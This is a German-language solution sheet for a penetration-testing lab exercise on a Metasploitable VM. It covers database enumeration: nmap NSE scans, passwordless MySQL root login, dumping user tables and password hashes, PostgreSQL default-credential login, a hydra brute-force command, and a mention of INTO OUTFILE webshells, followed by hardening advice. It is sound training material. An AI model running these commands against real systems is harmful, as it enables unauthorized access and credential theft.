# Lösung – Übung 08: Datenbank-Enumeration

`<ZIEL>` = Metasploitable-IP.

## 1. MySQL: leeres Passwort + Version (NSE)

```bash
nmap -p3306 --script mysql-info,mysql-empty-password <ZIEL>
```
```
| mysql-empty-password:
|   root account has empty password
| mysql-info:
|   Version: 5.0.51a-3ubuntu5
```
→ root ohne Passwort, Version 5.0.51a (alt → CVEs).

## 2. Verbinden + Datenbanken/Tabellen

```bash
mysql -h <ZIEL> -u root            # ohne -p, da leer
```
```sql
SHOW DATABASES;
USE dvwa;                 -- oder owasp10 / metasploit
SHOW TABLES;
SELECT * FROM users;      -- oft Usernamen + Passwort-Hashes
```
Non-interaktiv:
```bash
mysql -h <ZIEL> -u root -e "SHOW DATABASES; SELECT user,host FROM mysql.user;"
```

## 3. DB-User & Privilegien

```sql
SELECT user, host, password FROM mysql.user;      -- Accounts + Hashes
SHOW GRANTS FOR 'root'@'%';                         -- Privilegien
SELECT user,host,File_priv,Super_priv FROM mysql.user;  -- gefährliche Rechte
```
`File_priv=Y` → Lesen/Schreiben im Dateisystem der DB (`LOAD_FILE`, `INTO OUTFILE`) möglich; root@'%' = Login von überall.

## 4. PostgreSQL

```bash
nmap -p5432 --script pgsql-brute <ZIEL>
psql -h <ZIEL> -U postgres -d postgres       # Default postgres:postgres
```
```sql
SELECT version();
\l                       -- Datenbanken
\du                      -- Rollen + Attribute (Superuser?)
\c <db>
\dt                      -- Tabellen
```

## 5. Risiko-Kette & Härtung

- Einzeln wirken „offener Port", „leeres Passwort", „alte Version" harmlos – **zusammen** = direkter, unauthentifizierter Vollzugriff auf alle Daten + potenziell Dateisystem-/RCE (`FILE`-Privileg, `INTO OUTFILE` für Webshell).
- Härtung:
  - DB **nicht ans Netz** (`bind-address = 127.0.0.1`), nur App-Server via Segmentierung/Firewall.
  - **Starke, individuelle Credentials**, kein `root@'%'`, least privilege pro App-Account.
  - Version patchen; `FILE`/`SUPER` entziehen; Encryption at rest; Monitoring/Logging.

## Häufige Fehler / Troubleshooting

- **Client fehlt:** `sudo apt install default-mysql-client postgresql-client`.
- **MySQL `Access denied`:** doch Passwort gesetzt → NSE `mysql-empty-password` sagt es; sonst `hydra -l root -P rockyou.txt <ZIEL> mysql` (nur Lab).
- **`Host is not allowed to connect`:** Server erlaubt deine IP nicht (gut gehärtet) – dokumentieren.
- **psql fragt Passwort:** `PGPASSWORD=postgres psql -h <ZIEL> -U postgres` oder interaktiv eingeben.
